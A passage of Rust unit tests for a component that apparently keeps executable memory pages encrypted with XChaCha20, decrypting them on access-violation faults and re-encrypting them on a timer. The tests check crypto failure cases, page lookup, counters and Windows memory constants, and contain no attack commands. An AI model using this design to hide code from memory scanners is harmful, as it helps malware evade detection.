        let original = b"test data".to_vec();
        let mut data = original.clone();

        let tag = xchacha20_encrypt(&key, &nonce, &mut data);
        let result = xchacha20_decrypt(&wrong_key, &nonce, &mut data, &tag);
        assert!(result.is_err(), "decryption with wrong key should fail");
    }

    #[test]
    fn xchacha20_wrong_nonce_fails() {
        let key = [0x42u8; 32];
        let nonce = [0xABu8; 24];
        let wrong_nonce = [0xACu8; 24];
        let original = b"test data".to_vec();
        let mut data = original.clone();

        let tag = xchacha20_encrypt(&key, &nonce, &mut data);
        let result = xchacha20_decrypt(&key, &wrong_nonce, &mut data, &tag);
        assert!(result.is_err(), "decryption with wrong nonce should fail");
    }

    #[test]
    fn xchacha20_tampered_data_fails() {
        let key = [0x42u8; 32];
        let nonce = [0xABu8; 24];
        let original = b"test data for tamper detection".to_vec();
        let mut data = original.clone();

        let tag = xchacha20_encrypt(&key, &nonce, &mut data);
        data[0] ^= 0xFF; // Tamper with first byte.
        let result = xchacha20_decrypt(&key, &nonce, &mut data, &tag);
        assert!(result.is_err(), "decryption of tampered data should fail");
    }

    #[test]
    fn xchacha20_wrong_tag_fails() {
        let key = [0x42u8; 32];
        let nonce = [0xABu8; 24];
        let original = b"test data".to_vec();
        let mut data = original.clone();

        let _tag = xchacha20_encrypt(&key, &nonce, &mut data);
        let wrong_tag = [0xFFu8; 16];
        let result = xchacha20_decrypt(&key, &nonce, &mut data, &wrong_tag);
        assert!(result.is_err(), "decryption with wrong tag should fail");
    }

    // ── Page alignment ─────────────────────────────────────────────────

    #[test]
    fn page_size_is_power_of_two() {
        assert!(PAGE_SIZE.is_power_of_two());
        assert_eq!(PAGE_SIZE, 4096);
    }

    #[test]
    fn page_align_down() {
        let addr = 0x1234_5678_9ABCusize;
        let aligned = addr & !(PAGE_SIZE - 1);
        assert_eq!(aligned % PAGE_SIZE, 0);
        assert_eq!(aligned, 0x1234_5678_9000);
    }

    // ── ProtectedPage defaults ──────────────────────────────────────────

    #[test]
    fn protected_page_default() {
        let pp = ProtectedPage::default();
        assert!(pp.base.is_null());
        assert_eq!(pp.size, 0);
        assert_eq!(pp.nonce, [0u8; 24]);
        assert_eq!(pp.tag, [0u8; 16]);
        assert!(!pp.decrypted);
        assert_eq!(pp.fault_count, 0);
        assert_eq!(pp.last_access_ms, 0);
    }

    // ── PageFaultExec creation ──────────────────────────────────────────

    #[test]
    fn page_fault_exec_new() {
        let exec = PageFaultExec::new(1000);
        assert!(exec.pages.is_empty());
        assert_eq!(exec.active_count, 0);
        assert_eq!(exec.reencrypt_interval_ms, 1000);
        assert!(!exec.timer_active);
    }

    #[test]
    fn page_fault_exec_new_default_interval() {
        let exec = PageFaultExec::new(DEFAULT_REENCRYPT_INTERVAL_MS);
        assert_eq!(exec.reencrypt_interval_ms, 5000);
    }

    // ── find_page_for_address (empty) ──────────────────────────────────

    #[test]
    fn find_page_empty() {
        let exec = PageFaultExec::new(1000);
        assert!(exec.find_page_for_address(0x1000).is_none());
    }

    // ── find_page_for_address (with entries) ───────────────────────────

    #[test]
    fn find_page_with_entries() {
        let mut exec = PageFaultExec::new(1000);
        exec.pages.push(ProtectedPage {
            base: 0x10000 as *mut c_void,
            size: PAGE_SIZE,
            ..Default::default()
        });
        exec.pages.push(ProtectedPage {
            base: 0x11000 as *mut c_void,
            size: PAGE_SIZE,
            ..Default::default()
        });
        exec.active_count = 2;

        // Address within first page.
        assert_eq!(exec.find_page_for_address(0x10456), Some(0));
        // Address within second page.
        assert_eq!(exec.find_page_for_address(0x11ABC), Some(1));
        // Address not in any page.
        assert!(exec.find_page_for_address(0x12000).is_none());
        // Address below first page.
        assert!(exec.find_page_for_address(0x0FFF).is_none());
    }

    // ── page_base ──────────────────────────────────────────────────────

    #[test]
    fn page_base_returns_correct_address() {
        let mut exec = PageFaultExec::new(1000);
        exec.pages.push(ProtectedPage {
            base: 0xDEAD_0000 as *mut c_void,
            size: PAGE_SIZE,
            ..Default::default()
        });
        assert_eq!(exec.page_base(0), 0xDEAD_0000 as *mut c_void);
        assert!(exec.page_base(99).is_null());
    }

    // ── Statistics ─────────────────────────────────────────────────────

    #[test]
    fn stats_initial_values() {
        STAT_FAULT_COUNT.store(0, Ordering::SeqCst);
        STAT_DECRYPT_COUNT.store(0, Ordering::SeqCst);
        STAT_REENCRYPT_COUNT.store(0, Ordering::SeqCst);
        STAT_ANOMALY.store(false, Ordering::SeqCst);

        // Cannot test get_stats() fully without EXEC_INSTANCE, but we can
        // test the atomic counters.
        assert_eq!(STAT_FAULT_COUNT.load(Ordering::Relaxed), 0);
        assert_eq!(STAT_DECRYPT_COUNT.load(Ordering::Relaxed), 0);
        assert_eq!(STAT_REENCRYPT_COUNT.load(Ordering::Relaxed), 0);
        assert!(!STAT_ANOMALY.load(Ordering::Relaxed));
    }

    // ── Constants ──────────────────────────────────────────────────────

    #[test]
    fn constants_sanity() {
        assert_eq!(PAGE_NOACCESS, 0x01);
        assert_eq!(PAGE_READWRITE, 0x04);
        assert_eq!(PAGE_EXECUTE_READ, 0x20);
        assert_eq!(MEM_COMMIT, 0x00001000);
        assert_eq!(MEM_RESERVE, 0x00002000);
        assert_eq!(MEM_RELEASE, 0x00008000);
        assert_eq!(STATUS_ACCESS_VIOLATION, 0xC0000005);
        assert_eq!(EXCEPTION_CONTINUE_EXECUTION, -1);
        assert_eq!(EXCEPTION_CONTINUE_SEARCH, 0);
        assert!(MAX_PAGES > 0);
        assert!(DEFAULT_REENCRYPT_INTERVAL_MS > 0);
        assert!(MAX_FAULTS_BEFORE_ANOMALY > 0);
    }

    // ── Re-encrypt already-encrypted page ──────────────────────────────

    #[test]
    fn reencrypt_already_encrypted_is_ok() {
        // This test doesn't need real memory — just tests the early return.
        let mut exec = PageFaultExec::new(1000);
        exec.pages.push(ProtectedPage {
            base: std::ptr::null_mut(), // null base — won't actually call protect
            size: PAGE_SIZE,
            decrypted: false,
            ..Default::default()
        });
        // reencrypt_page on an already-encrypted page should return Ok(()).
        // NOTE: This will hit the early-return path (pp.decrypted == false).
        // However, it still tries to call protect_memory with a null base,
        // so we can only test the logic path — the early return happens first.
        // The function checks `if !pp.decrypted { return Ok(()); }` before
        // any syscalls, so this is safe.
        let result = exec.reencrypt_page(0);
        assert!(result.is_ok());
    }
}
